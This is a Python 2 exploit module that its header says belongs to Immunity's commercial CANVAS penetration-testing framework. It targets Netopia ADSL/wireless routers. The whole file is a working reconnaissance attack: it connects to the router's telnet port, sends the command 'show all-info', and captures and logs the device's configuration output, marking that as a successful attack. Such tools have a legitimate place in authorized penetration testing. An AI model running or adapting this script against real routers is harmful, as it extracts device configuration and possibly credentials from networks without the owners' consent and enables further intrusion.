#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation


import sys

if "." not in sys.path: sys.path.append(".")

import os
import socket
import select
import time

from exploitutils import *
import canvasengine

from tcpexploit import tcpexploit

DESCRIPTION="Netopia ADSL/Wireless information gathering"
VERSION="1.0"
NAME="Netopia ADSL/Wireless"

DOCUMENTATION = {}
DOCUMENTATION['VENDOR']="Netopia"
DOCUMENTATION["CVE Name"] = "None"
DOCUMENTATION["CVE Url"] = "None"

PROPERTY = {}
PROPERTY["TYPE"]= "Recon"
PROPERTY["TYPE"]= "Exploit"
PROPERTY["SITE"]= "Remote"
PROPERTY["ARCH"]= [ ["Embedded"] ]

class theexploit(tcpexploit):
    def __init__(self, host="localhost", port=23):
        tcpexploit.__init__(self)
        self.host = host
        self.port = port
	self.timeout = 15
        self.data = ""
        self.name=NAME        
        return

    
    def getargs(self):
	self.host       = self.target.interface
	self.port       = int(self.argsDict.get("port",self.port))
	self.timeout    = float(self.argsDict.get("timeout",self.timeout))
	return


    def run(self):
	self.getargs()
        self.setInfo("%s attacking %s:%d (in progress)"%(NAME,self.host,self.port))

        try:
            self.log("Attempting to connect to: %s:%d"%(self.host,self.port))
            self.setInfo("Attempting to connect to: %s:%d"%(self.host,self.port))
            sck = self.gettcpsock()
            sck.set_timeout(self.timeout)
    
            try:
                sck.connect((self.host, self.port))
            except:
                self.log("Connection failed")
                self.setInfo("Connection failed")
                return 0
    
            
            self.log("Connection established")
            self.setInfo("Connection established")
            
            time.sleep(0.5)
            cmd = "show all-info\n"
            self.log("Sending command: " + cmd)
            self.setInfo("Sending command: " + cmd)
            sck.send(cmd)
            
    
            self.log("Receiving results")
            self.setInfo("Receiving results")
            while True:
                try:
                    buf = sck.recv(1024)
                except:
                    break
                
                if buf == "":
                    print "Nothing more to receive"
                    break
                
                self.data += buf
                
            self.log("Received: "+ self.data)
            self.setInfo("Received data")
            
            sck.close()
            
        except:
            self.log("Failed attacking: %s:%d" % (self.host, self.port))
            self.setInfo("%s attacking %s:%d - done (failure)"%(NAME,self.host,self.port))
            return 0
        
	self.result = self.data
        self.setInfo("%s attacking %s:%d - done (success!)"%(NAME,self.host,self.port))
	self.log("%s attacking %s:%d - done (success!)"%(NAME,self.host,self.port))
	self.succeeded = 1
	return self.data
         

        
if __name__ == "__main__":
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
            
